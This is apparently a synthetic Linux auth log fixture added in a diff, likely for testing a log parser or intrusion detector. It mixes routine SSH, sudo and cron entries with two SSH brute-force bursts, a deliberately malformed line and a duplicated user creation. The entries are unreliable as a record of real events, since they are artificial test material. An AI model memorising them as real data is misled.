+Jun  5 18:48:38 webserver sshd[33952]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=devops
+Jun  5 20:13:19 webserver su[54241]: pam_unix(su:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/1 ruser=john rhost=  user=root
+Jun  5 21:43:45 webserver sshd[32951]: Disconnected from authenticating user priya 103.21.244.10 port 43605
+Jun  5 22:28:48 webserver sudo[10045]: pam_unix(sudo:auth): authentication failure; logname=test uid=1000 euid=0 tty=pts/0 ruser=test rhost=  user=root
+Jun  5 22:31:05 webserver sshd[18993]: Failed password for priya from 115.240.89.12 port 59829 ssh2
+Jun  5 23:56:01 webserver pam_unix[48998]: Accepted publickey for ubuntu from 103.21.244.10 port 56046 ssh2: RSA SHA256:0a6364510ea4c28fa61f25d8
+Jun  6 00:24:51 webserver sshd[19548]: pam_unix(sshd:session): session closed for user john
+Jun  6 01:27:36 webserver sudo[20934]:  admin_ops : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun  6 02:05:44 webserver CRON[35107]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun  6 02:32:53 webserver pam_unix[57770]: pam_unix(sshd:session): session closed for user deploy
+Jun  6 03:27:25 webserver su[14909]: Successful su for root by ubuntu
+Jun  6 03:51:38 webserver sshd[21632]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=admin_ops
+Jun  6 05:23:34 webserver sudo[47121]:  priya : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/systemctl reload nginx
+Jun  6 05:46:18 webserver sshd[13400]: Disconnected from authenticating user deploy 103.21.244.10 port 60234
+Jun  6 07:44:44 webserver sshd[37922]: pam_unix(sshd:session): session closed for user devops
+Jun  6 08:51:35 webserver sshd[12214]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun  6 09:38:21 webserver sudo[10980]: pam_unix(sudo:auth): authentication failure; logname=guest uid=1000 euid=0 tty=pts/0 ruser=guest rhost=  user=root
+Jun  6 10:00:32 webserver CRON[14616]: pam_unix(cron:session): session closed for user ubuntu
+Jun  6 10:39:18 webserver sudo[62472]:  deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/vim /etc/nginx/nginx.conf
+Jun  6 15:13:11 webserver sshd[57522]: Failed password for ubuntu from 14.139.123.45 port 63129 ssh2
+Jun  6 16:55:42 webserver sshd[12934]: Failed password for john from 117.55.34.78 port 43730 ssh2
+Jun  6 16:59:39 webserver sshd[10080]: Accepted publickey for john from 122.161.45.67 port 62041 ssh2: RSA SHA256:9fffc10712f70bc74890db69
+Jun  6 17:30:53 webserver CRON[55683]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun  6 18:41:34 webserver sshd[54392]: Disconnected from authenticating user john 14.139.123.45 port 50383
+Jun  6 20:49:41 webserver sshd[28299]: Failed password for devops from 115.240.89.12 port 59726 ssh2
+Jun  6 23:04:33 webserver sshd[16984]: Accepted password for ubuntu from 122.161.45.67 port 58979 ssh2
+Jun  7 01:06:09 webserver sshd[35431]: Disconnected from authenticating user ubuntu 122.161.45.67 port 63521
+Jun  7 04:09:08 webserver sshd[33518]: Accepted publickey for devops from 115.240.89.12 port 56683 ssh2: RSA SHA256:fd1a247ffcba28a3cf476e6d
+Jun  7 05:00:20 webserver sshd[51141]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=devops
+Jun  7 05:40:22 webserver sshd[29512]: Disconnected from authenticating user ubuntu 122.161.45.67 port 56940
+Jun  7 05:42:13 webserver sudo[22810]:  devops : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/bin/chmod 600 /etc/ssl/private/server.key
+Jun  7 06:35:44 webserver sshd[16057]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=115.240.89.12  user=devops
+Jun  7 07:13:05 webserver sshd[32386]: Disconnected from authenticating user deploy 122.161.45.67 port 51078
+Jun  7 07:17:18 webserver sshd[57137]: pam_unix(sshd:session): session closed for user deploy
+Jun  7 07:40:42 webserver pam_unix[20709]: pam_unix(sshd:session): session closed for user john
+Jun  7 08:24:07 webserver sshd[57716]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=deploy
+Jun  7 08:38:36 webserver pam_unix[37382]: pam_unix(sshd:session): session closed for user devops
+Jun  7 08:52:35 webserver sshd[15510]: pam_unix(sshd:session): session closed for user priya
+Jun  7 09:01:59 webserver sshd[47213]: Accepted publickey for devops from 115.240.89.12 port 46378 ssh2: RSA SHA256:3fd858d1af21d2a55c336d95
+Jun  7 09:44:46 webserver pam_unix[27058]: Disconnected from authenticating user priya 103.21.244.10 port 53719
+Jun  7 11:04:06 webserver sshd[47059]: Accepted password for admin_ops from 122.161.45.67 port 46076 ssh2
+Jun  7 12:33:54 webserver sshd[30164]: Disconnected from authenticating user deploy 122.161.45.67 port 43642
+Jun  7 12:53:09 webserver sudo[56220]:  ubuntu : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/docker restart api_container
+Jun  7 13:12:47 webserver pam_unix[36458]: Accepted password for devops from 14.139.123.45 port 48293 ssh2
+Jun  7 14:01:13 webserver sshd[39740]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=14.139.123.45  user=ubuntu
+Jun  7 14:04:15 webserver sshd[56540]: Failed password for john from 115.240.89.12 port 52925 ssh2
+Jun  7 14:33:30 webserver sudo[45091]:  devops : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Jun  7 15:20:14 webserver sshd[23674]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun  7 18:46:41 webserver sshd[16634]: Failed password for john from 122.161.45.67 port 56962 ssh2
+Jun  7 18:51:34 webserver sshd[58267]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun  7 19:04:21 webserver sshd[28299]: Disconnected from authenticating user admin_ops 14.139.123.45 port 61460
+Jun  7 19:09:06 webserver passwd[53187]: pam_unix(passwd:chauthtok): password changed for devops
+Jun  7 19:09:15 webserver sshd[29646]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun  7 21:20:53 webserver pam_unix[31673]: Disconnected from authenticating user admin_ops 115.240.89.12 port 61909
+Jun  7 21:42:14 webserver sshd[22521]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=admin_ops
+Jun  7 22:52:33 webserver sshd[39450]: Disconnected from authenticating user john 49.36.78.145 port 43595
+Jun  7 22:57:38 webserver sshd[37767]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=devops
+Jun  8 00:06:27 webserver su[58011]: pam_unix(su:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/1 ruser=john rhost=  user=root
+Jun  8 01:59:02 webserver pam_unix[49697]: Accepted publickey for john from 14.139.123.45 port 56896 ssh2: RSA SHA256:b2de21aec28605f6a23d3c16
+Jun  8 02:01:14 webserver sshd[46253]: Invalid user user from 80.82.77.44 port 42134
+Jun  8 02:01:15 webserver sshd[46253]: Connection closed by invalid user user 80.82.77.44 port 42134 [preauth]
+Jun  8 02:04:10 webserver sshd[15955]: Failed password for invalid user www-data from 80.82.77.44 port 56442 ssh2
+Jun  8 02:04:12 webserver sshd[15955]: Connection closed by invalid user www-data 80.82.77.44 port 56442 [preauth]
+Jun  8 02:05:28 webserver sshd[23149]: Failed password for invalid user webmaster from 80.82.77.44 port 40272 ssh2
+Jun  8 02:05:31 webserver sshd[23149]: Connection closed by invalid user webmaster 80.82.77.44 port 40272 [preauth]
+Jun  8 02:06:04 webserver sshd[59249]: Invalid user root from 80.82.77.44 port 47033
+Jun  8 02:06:07 webserver sshd[59249]: Connection closed by invalid user root 80.82.77.44 port 47033 [preauth]
+Jun  8 02:11:59 webserver sshd[59330]: Invalid user deploy2 from 80.82.77.44 port 51727
+Jun  8 02:12:01 webserver sshd[59330]: Connection closed by invalid user deploy2 80.82.77.44 port 51727 [preauth]
+Jun  8 02:18:01 webserver sshd[48185]: Failed password for invalid user jenkins from 80.82.77.44 port 42654 ssh2
+Jun  8 02:18:03 webserver sshd[48185]: Connection closed by invalid user jenkins 80.82.77.44 port 42654 [preauth]
+Jun  8 02:22:28 webserver sshd[44516]: Failed password for invalid user ubuntu2 from 80.82.77.44 port 41995 ssh2
+Jun  8 02:22:29 webserver sshd[44516]: Connection closed by invalid user ubuntu2 80.82.77.44 port 41995 [preauth]
+Jun  8 02:23:45 webserver sshd[14184]: Invalid user backup from 80.82.77.44 port 61994
+Jun  8 02:23:47 webserver sshd[14184]: Connection closed by invalid user backup 80.82.77.44 port 61994 [preauth]
+Jun  8 02:27:24 webserver sshd[55706]: Failed password for invalid user admin from 80.82.77.44 port 60940 ssh2
+Jun  8 02:27:26 webserver sshd[55706]: Connection closed by invalid user admin 80.82.77.44 port 60940 [preauth]
+Jun  8 02:27:38 webserver sshd[42301]: Invalid user nagios from 80.82.77.44 port 49757
+Jun  8 02:27:41 webserver sshd[42301]: Connection closed by invalid user nagios 80.82.77.44 port 49757 [preauth]
+Jun  8 02:28:26 webserver sshd[51631]: Failed password for invalid user mysql from 80.82.77.44 port 62785 ssh2
+Jun  8 02:28:28 webserver sshd[51631]: Connection closed by invalid user mysql 80.82.77.44 port 62785 [preauth]
+Jun  8 02:32:24 webserver sshd[24062]: Invalid user oracle from 80.82.77.44 port 53899
+Jun  8 02:32:25 webserver sshd[24062]: Connection closed by invalid user oracle 80.82.77.44 port 53899 [preauth]
+Jun  8 02:37:25 webserver sshd[55760]: Invalid user pi from 80.82.77.44 port 57165
+Jun  8 02:37:26 webserver sshd[55760]: Connection closed by invalid user pi 80.82.77.44 port 57165 [preauth]
+Jun  8 02:39:10 webserver sshd[28405]: Failed password for invalid user test from 80.82.77.44 port 55366 ssh2
+Jun  8 02:39:11 webserver sshd[28405]: Connection closed by invalid user test 80.82.77.44 port 55366 [preauth]
+Jun  8 02:39:29 webserver sshd[13600]: Invalid user guest from 80.82.77.44 port 61818
+Jun  8 02:39:32 webserver sshd[13600]: Connection closed by invalid user guest 80.82.77.44 port 61818 [preauth]
+Jun  8 02:41:45 webserver sshd[41497]: Invalid user support from 80.82.77.44 port 56462
+Jun  8 02:41:46 webserver sshd[35845]: Failed password for invalid user git from 80.82.77.44 port 47360 ssh2
+Jun  8 02:41:48 webserver sshd[41497]: Connection closed by invalid user support 80.82.77.44 port 56462 [preauth]
+Jun  8 02:41:48 webserver sshd[35845]: Connection closed by invalid user git 80.82.77.44 port 47360 [preauth]
+Jun  8 02:42:29 webserver sshd[63244]: Failed password for invalid user ftpuser from 80.82.77.44 port 55377 ssh2
+Jun  8 02:42:31 webserver sshd[63244]: Connection closed by invalid user ftpuser 80.82.77.44 port 55377 [preauth]
+Jun  8 02:44:58 webserver sshd[32548]: Failed password for invalid user postgres from 80.82.77.44 port 63623 ssh2
+Jun  8 02:44:59 webserver sshd[32548]: Connection closed by invalid user postgres 80.82.77.44 port 63623 [preauth]
+Jun  8 03:58:59 webserver sudo[42831]:  priya : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun  8 04:05:29 webserver sudo[24744]: pam_unix(sudo:auth): authentication failure; logname=admin_ops uid=1000 euid=0 tty=pts/0 ruser=admin_ops rhost=  user=root
+Jun  8 06:07:04 webserver CRON[15731]: pam_unix(cron:session): session opened for user root by (uid=0)
+Jun  8 08:14:13 webserver sudo[64250]:  deploy : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/docker restart api_container
+Jun  8 09:34:40 webserver sudo[61215]: pam_unix(sudo:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/0 ruser=ubuntu rhost=  user=root
+Jun  8 10:46:49 webserver pam_unix[28138]: Disconnected from authenticating user priya 103.21.244.10 port 63101
+Jun  8 10:52:57 webserver pam_unix[17552]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=devops
+Jun  8 11:55:47 webserver pam_unix[15975]: pam_unix(sshd:session): session closed for user john
+Jun  8 13:23:03 webserver sshd[12911]: pam_unix(sshd:session): session closed for user admin_ops
+this is not a valid auth log line
+Jun  8 16:32:38 webserver sshd[60699]: Accepted publickey for priya from 49.36.78.145 port 46962 ssh2: RSA SHA256:1972d2329dcef6a33ca9d839
+Jun  8 16:49:42 webserver sudo[13577]:  ubuntu : TTY=pts/1 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Jun  8 16:57:12 webserver sshd[17441]: Accepted password for admin_ops from 115.240.89.12 port 43637 ssh2
+Jun  8 19:42:29 webserver sshd[22656]: Accepted password for deploy from 103.21.244.10 port 47880 ssh2
+Jun  8 19:48:41 webserver passwd[50485]: pam_unix(passwd:chauthtok): password changed for devops
+Jun  8 20:40:34 webserver su[59755]: Successful su for root by devops
+Jun  8 20:46:17 webserver pam_unix[34517]: pam_unix(sshd:session): session closed for user admin_ops
+Jun  8 21:56:47 webserver sshd[12369]: Failed password for john from 115.240.89.12 port 50347 ssh2
+Jun  9 01:05:22 webserver pam_unix[33804]: Accepted publickey for priya from 122.161.45.67 port 49174 ssh2: RSA SHA256:f3845c980eb92270539d2766
+Jun  9 01:44:33 webserver sshd[42128]: Accepted password for ubuntu from 49.36.78.145 port 43524 ssh2
+Jun  9 02:08:29 webserver pam_unix[40964]: Accepted password for priya from 115.240.89.12 port 45681 ssh2
+Jun  9 02:12:45 webserver sshd[15713]: pam_unix(sshd:session): session closed for user devops
+Jun  9 03:09:01 webserver sudo[41549]:  priya : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/apt update
+Jun  9 03:44:14 webserver sudo[24106]:  deploy : TTY=pts/2 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/docker ps
+Jun  9 04:09:48 webserver sshd[36827]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun  9 04:33:24 webserver sshd[47815]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun  9 04:49:07 webserver pam_unix[32280]: pam_unix(sshd:session): session closed for user admin_ops
+Jun  9 07:07:18 webserver sudo[23515]:  priya : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/apt update
+Jun  9 07:38:09 webserver sudo[17309]: pam_unix(sudo:auth): authentication failure; logname=john uid=1000 euid=0 tty=pts/0 ruser=john rhost=  user=root
+Jun  9 08:59:36 webserver sshd[15363]: Accepted password for priya from 103.21.244.10 port 60166 ssh2
+Jun  9 09:36:50 webserver sshd[43229]: pam_unix(sshd:session): session closed for user admin_ops
+Jun  9 11:19:00 webserver sshd[30435]: Accepted password for ubuntu from 122.161.45.67 port 55545 ssh2
+Jun  9 11:22:22 webserver sudo[53747]:  john : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/docker ps
+Jun  9 13:05:43 webserver sshd[61466]: Disconnected from authenticating user admin_ops 115.240.89.12 port 44150
+Jun  9 13:40:32 webserver CRON[37888]: pam_unix(cron:session): session closed for user root
+Jun  9 13:48:44 webserver sudo[15330]:  devops : TTY=pts/2 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/cp /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app
+Jun  9 14:42:43 webserver sshd[58358]: Accepted password for ubuntu from 122.161.45.67 port 46233 ssh2
+Jun  9 15:13:24 webserver sshd[37996]: Accepted publickey for ubuntu from 103.21.244.10 port 51229 ssh2: RSA SHA256:67c89cbfa4b4ec4f70b56b38
+Jun  9 15:37:38 webserver sshd[44127]: Disconnected from authenticating user ubuntu 115.240.89.12 port 59909
+Jun  9 15:47:10 webserver pam_unix[14029]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=117.55.34.78  user=john
+Jun  9 16:15:07 webserver pam_unix[33876]: Accepted password for ubuntu from 14.139.123.45 port 63291 ssh2
+Jun  9 17:07:43 webserver CRON[54539]: pam_unix(cron:session): session closed for user root
+Jun  9 20:32:02 webserver sudo[47114]:  john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/certbot renew
+Jun  9 21:33:44 webserver sshd[45804]: Failed password for admin_ops from 117.55.34.78 port 54048 ssh2
+Jun 10 00:34:39 webserver sshd[58625]: pam_unix(sshd:session): session closed for user devops
+Jun 10 01:33:28 webserver su[37056]: pam_unix(su:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/1 ruser=ubuntu rhost=  user=root
+Jun 10 03:04:25 webserver pam_unix[26798]: Disconnected from authenticating user priya 122.161.45.67 port 43729
+Jun 10 03:12:57 webserver pam_unix[10046]: Accepted password for john from 122.161.45.67 port 58860 ssh2
+Jun 10 05:08:42 webserver sudo[64938]: pam_unix(sudo:auth): authentication failure; logname=devops uid=1000 euid=0 tty=pts/0 ruser=devops rhost=  user=root
+Jun 10 05:10:45 webserver sshd[32592]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=103.21.244.10  user=deploy
+Jun 10 05:58:33 webserver pam_unix[33055]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=admin_ops
+Jun 10 08:54:26 webserver sudo[51600]:  devops : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 10 09:21:07 webserver sshd[61115]: pam_unix(sshd:session): session closed for user devops
+Jun 10 09:23:26 webserver su[23519]: Successful su for root by devops
+Jun 10 09:24:04 webserver sshd[63243]: Accepted publickey for john from 117.55.34.78 port 48875 ssh2: RSA SHA256:917af6bfc304dd901e56afb0
+Jun 10 09:35:04 webserver sshd[28210]: pam_unix(sshd:session): session opened for user john by (uid=0)
+Jun 10 09:49:59 webserver sshd[34288]: Disconnected from authenticating user deploy 14.139.123.45 port 40888
+Jun 10 10:25:13 webserver sshd[54110]: Accepted publickey for john from 117.55.34.78 port 51920 ssh2: RSA SHA256:1d98eefeea4ea5a3f71f84a1
+Jun 10 11:38:42 webserver sshd[12652]: Accepted password for admin_ops from 103.21.244.10 port 62236 ssh2
+Jun 10 13:46:29 webserver sshd[36539]: Accepted password for admin_ops from 14.139.123.45 port 48679 ssh2
+Jun 10 14:35:01 webserver useradd[14883]: new user: name=svc_api, UID=1959, GID=1923, home=/home/svc_api, shell=/bin/bash
+Jun 10 15:18:26 webserver pam_unix[24214]: Accepted publickey for ubuntu from 103.21.244.10 port 62783 ssh2: RSA SHA256:4a678fda1d4ad19206b6b50a
+Jun 10 15:21:21 webserver su[52898]: Successful su for root by priya
+Jun 10 17:10:44 webserver sudo[50859]:  admin_ops : TTY=pts/0 ; PWD=/var/www/app ; USER=root ; COMMAND=/usr/bin/docker ps
+Jun 10 17:20:19 webserver useradd[15738]: new user: name=svc_api, UID=1433, GID=1755, home=/home/svc_api, shell=/bin/bash
+Jun 10 21:10:07 webserver sshd[11004]: Accepted publickey for priya from 117.55.34.78 port 48439 ssh2: RSA SHA256:f384404a2f55f9442b9a2671
+Jun 10 22:05:12 webserver sudo[61671]:  john : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun 11 01:54:54 webserver sshd[34509]: Accepted publickey for devops from 103.21.244.10 port 49237 ssh2: RSA SHA256:f1524efede2daf00508ce71e
+Jun 11 03:34:04 webserver sshd[50447]: pam_unix(sshd:session): session opened for user devops by (uid=0)
+Jun 11 03:52:22 webserver sshd[63230]: Disconnected from authenticating user john 117.55.34.78 port 46273
+Jun 11 04:55:00 webserver sshd[22429]: Failed password for invalid user webmaster from 185.220.101.34 port 46391 ssh2
+Jun 11 04:55:02 webserver sshd[19926]: Failed password for priya from 185.220.101.34 port 41230 ssh2
+Jun 11 04:55:04 webserver sshd[40135]: Failed password for invalid user support from 185.220.101.34 port 54295 ssh2
+Jun 11 04:55:05 webserver sshd[56575]: Failed password for ubuntu from 185.220.101.34 port 45291 ssh2
+Jun 11 04:55:06 webserver sshd[36023]: Failed password for john from 185.220.101.34 port 58116 ssh2
+Jun 11 04:55:10 webserver sshd[48751]: Failed password for invalid user nagios from 185.220.101.34 port 50834 ssh2
+Jun 11 04:55:11 webserver sshd[19662]: Failed password for deploy from 185.220.101.34 port 58227 ssh2
+Jun 11 04:55:11 webserver sshd[13285]: Failed password for deploy from 185.220.101.34 port 53840 ssh2
+Jun 11 04:55:12 webserver sshd[29602]: Failed password for test from 185.220.101.34 port 45518 ssh2
+Jun 11 04:55:13 webserver sshd[43436]: Failed password for admin_ops from 185.220.101.34 port 56392 ssh2
+Jun 11 04:55:13 webserver sshd[18431]: Failed password for john from 185.220.101.34 port 47556 ssh2
+Jun 11 04:55:14 webserver sshd[51125]: Failed password for priya from 185.220.101.34 port 59792 ssh2
+Jun 11 04:55:15 webserver sshd[23684]: Failed password for oracle from 185.220.101.34 port 40869 ssh2
+Jun 11 04:55:20 webserver sshd[32852]: Failed password for oracle from 185.220.101.34 port 59883 ssh2
+Jun 11 04:55:21 webserver sshd[54499]: Failed password for invalid user mysql from 185.220.101.34 port 58437 ssh2
+Jun 11 04:55:22 webserver sshd[42378]: Failed password for guest from 185.220.101.34 port 59639 ssh2
+Jun 11 04:55:22 webserver sshd[24336]: Failed password for invalid user ftpuser from 185.220.101.34 port 57713 ssh2
+Jun 11 04:55:23 webserver sshd[43247]: Failed password for admin from 185.220.101.34 port 60106 ssh2
+Jun 11 04:55:24 webserver sshd[28511]: Failed password for invalid user backup from 185.220.101.34 port 53408 ssh2
+Jun 11 04:55:24 webserver sshd[33127]: Failed password for oracle from 185.220.101.34 port 45927 ssh2
+Jun 11 04:55:27 webserver sshd[41086]: Failed password for admin_ops from 185.220.101.34 port 57497 ssh2
+Jun 11 04:55:28 webserver sshd[64945]: Failed password for admin from 185.220.101.34 port 40044 ssh2
+Jun 11 04:55:30 webserver sshd[45672]: Failed password for admin from 185.220.101.34 port 54814 ssh2
+Jun 11 04:55:31 webserver sshd[55407]: Failed password for admin_ops from 185.220.101.34 port 58332 ssh2
+Jun 11 04:55:36 webserver sshd[37210]: Failed password for invalid user backup from 185.220.101.34 port 43334 ssh2
+Jun 11 04:55:36 webserver sshd[27745]: Failed password for invalid user git from 185.220.101.34 port 48522 ssh2
+Jun 11 04:55:41 webserver sshd[35564]: Failed password for invalid user support from 185.220.101.34 port 49776 ssh2
+Jun 11 04:55:45 webserver sshd[50394]: Failed password for test from 185.220.101.34 port 50701 ssh2
+Jun 11 04:55:51 webserver sshd[44551]: Failed password for invalid user deploy2 from 185.220.101.34 port 44766 ssh2
+Jun 11 04:55:54 webserver sshd[49827]: Failed password for invalid user git from 185.220.101.34 port 59968 ssh2
+Jun 11 06:02:07 webserver sshd[54349]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
+Jun 11 06:40:29 webserver sshd[56153]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=122.161.45.67  user=priya
+Jun 11 06:51:27 webserver passwd[59075]: pam_unix(passwd:chauthtok): password changed for devops
+Jun 11 07:24:22 webserver su[61274]: pam_unix(su:auth): authentication failure; logname=ubuntu uid=1000 euid=0 tty=pts/1 ruser=ubuntu rhost=  user=root
+Jun 11 07:50:35 webserver CRON[50078]: pam_unix(cron:session): session opened for user ubuntu by (uid=0)
+Jun 11 10:37:41 webserver sshd[27714]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 11 11:17:40 webserver sshd[40056]: Disconnected from authenticating user john 49.36.78.145 port 51357
+Jun 11 11:49:53 webserver sshd[40118]: Failed password for priya from 49.36.78.145 port 59918 ssh2
+Jun 11 12:32:00 webserver sshd[64073]: Disconnected from authenticating user admin_ops 115.240.89.12 port 63344
+Jun 11 13:42:57 webserver sshd[52707]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=admin_ops
+Jun 11 14:19:05 webserver sudo[18077]:  deploy : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+Jun 11 15:01:18 webserver sudo[34354]:  deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/cp /etc/nginx/sites-available/app /etc/nginx/sites-enabled/app
+Jun 11 15:24:04 webserver pam_unix[50836]: Disconnected from authenticating user admin_ops 103.21.244.10 port 59708
+Jun 11 16:09:52 webserver sudo[27629]:  john : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/kill -9 1234
+Jun 11 16:45:25 webserver sshd[49712]: Disconnected from authenticating user priya 103.21.244.10 port 44640
+Jun 11 16:57:34 webserver sshd[21521]: Disconnected from authenticating user deploy 115.240.89.12 port 61024
+Jun 11 17:39:36 webserver sshd[38153]: pam_unix(sshd:session): session closed for user john
+Jun 11 18:28:56 webserver sshd[46485]: Accepted publickey for admin_ops from 115.240.89.12 port 61604 ssh2: RSA SHA256:d9b1e366e95545b2ad02af18
+Jun 11 21:53:08 webserver sudo[44834]:  john : TTY=pts/2 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Jun 11 22:41:03 webserver sshd[18888]: Accepted publickey for john from 14.139.123.45 port 43378 ssh2: RSA SHA256:cb7bf3420823be35f6189dc5
+Jun 11 23:48:53 webserver sshd[19024]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun 12 00:39:34 webserver sshd[43750]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 12 00:40:02 webserver pam_unix[48554]: Accepted publickey for priya from 122.161.45.67 port 44356 ssh2: RSA SHA256:b492f4d2ed053d8e34eae11e
+Jun 12 00:49:14 webserver CRON[34040]: pam_unix(cron:session): session closed for user ubuntu
+Jun 12 03:44:23 webserver pam_unix[15432]: Accepted password for john from 115.240.89.12 port 55774 ssh2
+Jun 12 03:48:37 webserver sudo[50478]:  priya : TTY=pts/0 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql
+Jun 12 04:04:12 webserver sshd[17820]: Disconnected from authenticating user priya 115.240.89.12 port 52716
+Jun 12 04:15:00 webserver sshd[41413]: Disconnected from authenticating user admin_ops 115.240.89.12 port 52018
+Jun 12 04:55:53 webserver sudo[54130]: pam_unix(sudo:auth): authentication failure; logname=test uid=1000 euid=0 tty=pts/0 ruser=test rhost=  user=root
+Jun 12 05:08:55 webserver sshd[30276]: Accepted password for deploy from 49.36.78.145 port 44045 ssh2
+Jun 12 05:50:46 webserver pam_unix[62730]: pam_unix(sshd:session): session closed for user devops
+Jun 12 05:54:21 webserver sudo[49782]: pam_unix(sudo:auth): authentication failure; logname=root uid=1000 euid=0 tty=pts/0 ruser=root rhost=  user=root
+Jun 12 06:36:45 webserver sudo[34357]: pam_unix(sudo:auth): authentication failure; logname=test uid=1000 euid=0 tty=pts/0 ruser=test rhost=  user=root
+Jun 12 06:44:22 webserver sshd[50545]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 12 06:46:00 webserver sudo[51504]:  ubuntu : TTY=pts/2 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/pg_dump -U postgres mydb > /backups/mydb.sql
+Jun 12 07:02:25 webserver sshd[23700]: Accepted password for ubuntu from 117.55.34.78 port 46546 ssh2
+Jun 12 08:48:35 webserver sshd[62702]: pam_unix(sshd:session): session closed for user devops
+Jun 12 09:40:16 webserver sshd[34335]: Failed password for ubuntu from 49.36.78.145 port 50479 ssh2
+Jun 12 11:02:03 webserver pam_unix[11494]: pam_unix(sshd:session): session opened for user priya by (uid=0)
+Jun 12 12:15:49 webserver sshd[40109]: Accepted password for admin_ops from 49.36.78.145 port 59699 ssh2
+Jun 12 12:28:01 webserver sshd[18666]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=priya
+Jun 12 12:37:32 webserver sudo[21523]:  devops : TTY=pts/1 ; PWD=/etc/nginx ; USER=root ; COMMAND=/usr/bin/apt update
+Jun 12 12:52:30 webserver sshd[38442]: Accepted password for ubuntu from 49.36.78.145 port 43581 ssh2
+Jun 12 13:29:51 webserver sshd[59854]: Disconnected from authenticating user devops 117.55.34.78 port 60471
+Jun 12 14:09:15 webserver sshd[28191]: pam_unix(sshd:session): session opened for user admin_ops by (uid=0)
+Jun 12 16:11:23 webserver pam_unix[41501]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=49.36.78.145  user=devops
+Jun 12 18:14:56 webserver sudo[58204]: pam_unix(sudo:auth): authentication failure; logname=devops uid=1000 euid=0 tty=pts/0 ruser=devops rhost=  user=root
+Jun 12 21:31:21 webserver sshd[22966]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0)
+Jun 12 22:04:19 webserver sshd[16300]: Disconnected from authenticating user priya 117.55.34.78 port 55143
+Jun 13 03:07:14 webserver sshd[12106]: Accepted publickey for john from 115.240.89.12 port 59454 ssh2: RSA SHA256:039a199348bd740a87eced83
+Jun 13 05:50:03 webserver sshd[37365]: Accepted password for priya from 14.139.123.45 port 42615 ssh2
